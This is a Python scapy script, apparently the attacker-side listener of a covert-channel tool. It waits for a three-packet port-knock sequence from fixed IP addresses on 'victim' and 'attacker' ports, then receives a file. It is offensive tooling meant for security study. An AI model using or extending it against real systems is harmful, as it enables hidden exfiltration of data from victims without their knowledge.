from scapy.all import *
from scapy.layers.inet import IP, UDP
from crypto import *
from config import *
import time
from transfer import *

knock_number = 0
knock_timer =0
knock_1 = "192.168.40.4"
knock_2 = "192.168.50.5"
knock_3 = "192.168.60.6"
ALLOWED_TIME_BETWEEN_KNOCKS = 10

def in_time():
    elapsed_time = time.time() - knock_timer
    if elapsed_time < ALLOWED_TIME_BETWEEN_KNOCKS:
        return True
    else:
        return False

def sniff_knocks(packet):
    print ("Checking packet for knock")
    global knock_number
    global knock_timer
    # If knock_1 rest knock_number and start timer.
    if packet["IP"].src == knock_1:
        print ("Knock 1")
        knock_number = 1
        knock_timer = time.time()
    if packet["IP"].src == knock_2:
        if (knock_number == 1) & (in_time()):
            print ("Knock 2")
            knock_number = 2
            knock_timer = time.time()
        else:
            knock_number = 0
            knock_timer = 0
    if packet["IP"].src == knock_3:
        if (knock_number == 2) & (in_time()):
            print ("Knock 3")
            knock_number = 0
            knock_timer = 0
            print ("Knock, knock, knock.... Opening Ports")
            ReceiveFile()

        else:
            knock_number = 0
            knock_timer = 0


def ReceiveFile():
    listen_for_file()







def main():
    print ("Listening for Knocks!")
    sniff(filter="udp and src port " + str(VICTIM_PORT) + " and dst port " + str(ATTACKER_PORT), prn=sniff_knocks)





if __name__ == '__main__':
    main()